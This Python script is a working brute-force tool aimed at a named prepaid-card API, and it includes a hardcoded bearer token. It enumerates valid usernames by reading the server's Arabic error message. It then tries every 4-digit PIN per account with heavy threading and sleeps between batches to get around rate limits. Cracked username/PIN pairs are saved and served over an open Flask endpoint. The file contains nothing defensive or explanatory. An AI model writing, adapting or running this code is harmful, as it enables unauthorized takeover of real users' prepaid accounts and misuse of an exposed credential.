
import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from flask import Flask, jsonify
import threading

# === CONFIG ===
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
MAX_REQUESTS = 1000
STATE_FILE = "bruteforce_state.json"
RESULTS_FILE = "successful_attempts.json"

app = Flask(__name__)

# === STATE MANAGEMENT ===
def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            state = json.load(f)
            state["tried_passwords"] = {k: set(v) for k, v in state["tried_passwords"].items()}
            return state
    return {"valid_usernames": [], "tried_passwords": {}}

def save_state(valid_usernames, tried_passwords):
    serializable_tried_passwords = {k: list(v) for k, v in tried_passwords.items()}
    state = {"valid_usernames": valid_usernames, "tried_passwords": serializable_tried_passwords}
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=4)

def save_success(username, password, info):
    successes = []
    if os.path.exists(RESULTS_FILE):
        with open(RESULTS_FILE, 'r') as f:
            successes = json.load(f)
    
    successes.append({
        "username": username,
        "password": password,
        "status": info.get('status'),
        "duration": info.get('group_duration'),
        "remaining": info.get('readable_remaining_time'),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    })
    
    with open(RESULTS_FILE, 'w') as f:
        json.dump(successes, f, indent=4)

# === API REQUEST ===
# Global variables for rate limiting
last_request_time = 0
request_counter = 0

def send_request(payload):
    global last_request_time, request_counter
    
    # Rate limiting logic
    current_time = time.time()
    if current_time - last_request_time >= 10:  # Reset counter every 10 seconds
        request_counter = 0
        last_request_time = current_time
    elif request_counter >= 2:  # Only allow 2 requests per 10 second window
        sleep_time = 10 - (current_time - last_request_time)
        if sleep_time > 0:
            time.sleep(sleep_time)
            last_request_time = time.time()
            request_counter = 0

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": AUTH_HEADER,
        "Accept-Language": LANGUAGE
    }
    try:
        response = requests.post(API_URL, json=payload, headers=headers)
        request_counter += 1
        return response.json(), payload
    except Exception as e:
        return {"error": str(e)}, payload

# === STEP 1: Generate and validate usernames ===
def generate_valid_usernames(prefix="20", count=1000, existing_usernames=None):
    print("🔍 Scanning usernames concurrently...")
    valid_usernames = existing_usernames or []
    usernames_to_test = count - len(valid_usernames)

    if usernames_to_test <= 0:
        print(f"✅ Already have {len(valid_usernames)} valid usernames.")
        return valid_usernames

    usernames = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(usernames_to_test)]
    payloads = [{"username": u} for u in usernames]

    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(send_request, payload) for payload in payloads]
        for future in tqdm(as_completed(futures), total=len(futures), desc="Validating"):
            result, payload = future.result()
            if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                valid_usernames.append(payload["username"])

    print(f"\n✅ Found {len(valid_usernames)} valid usernames in total.")
    save_state(valid_usernames, load_state().get("tried_passwords", {}))
    return valid_usernames

# === STEP 2: Brute-force passwords for each username ===
def try_passwords_for_users(valid_usernames):
    state = load_state()
    tried_passwords = state.get("tried_passwords", {})

    while True:  # Continuous operation
        for username in valid_usernames:
            tried = tried_passwords.get(username, set())
            remaining_passwords = [str(i).zfill(4) for i in range(10000) if str(i).zfill(4) not in tried]

            if not remaining_passwords:
                print(f"✅ All passwords tried for {username}.")
                continue

            print(f"\n🔐 Trying passwords for: {username} ({len(remaining_passwords)} remaining)")

            while remaining_passwords:
                batch = remaining_passwords[:MAX_REQUESTS]
                payloads = [{"username": username, "password": p} for p in batch]

                success = None
                with ThreadPoolExecutor(max_workers=MAX_REQUESTS) as executor:
                    futures = [executor.submit(send_request, payload) for payload in payloads]
                    for future in tqdm(as_completed(futures), total=len(futures), desc=f"Trying {username}"):
                        result, payload = future.result()

                        if result.get("status") is True and result.get("code") == 200:
                            info = result.get("data", {})
                            success = payload["password"]
                            print(f"\n✅ SUCCESS for {username} → Password: {success}")
                            print(f"➤ Status: {info.get('status')}")
                            print(f"➤ Duration: {info.get('group_duration')}")
                            print(f"➤ Remaining: {info.get('readable_remaining_time')}")
                            save_success(username, success, info)
                            tried_passwords[username] = tried_passwords.get(username, set()) | set(batch)
                            save_state(valid_usernames, tried_passwords)
                            break

                        tried_passwords[username] = tried_passwords.get(username, set()) | {payload["password"]}

                if success:
                    break

                remaining_passwords = remaining_passwords[MAX_REQUESTS:]
                save_state(valid_usernames, tried_passwords)

                if remaining_passwords:
                    print(f"🛌 Waiting 60s to send next batch for {username}...")
                    time.sleep(60)

# === WEB SERVER ROUTES ===
@app.route('/results')
def get_results():
    if os.path.exists(RESULTS_FILE):
        with open(RESULTS_FILE, 'r') as f:
            return jsonify(json.load(f))
    return jsonify([])

def run_bruteforce():
    while True:
        try:
            prefix = "20"  # Fixed prefix
            count = MAX_REQUESTS
            state = load_state()
            valid_usernames = generate_valid_usernames(prefix, count, state.get("valid_usernames", []))

            if valid_usernames:
                print(f"📊 Testing {len(valid_usernames)} usernames.")
                try_passwords_for_users(valid_usernames)
            else:
                print("❗ No valid usernames found.")
                time.sleep(60)  # Wait before retrying
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(60)  # Wait before retrying

if __name__ == "__main__":
    # Start bruteforce in a separate thread
    bruteforce_thread = threading.Thread(target=run_bruteforce, daemon=True)
    bruteforce_thread.start()
    
    # Start web server
    app.run(host='0.0.0.0', port=5000)
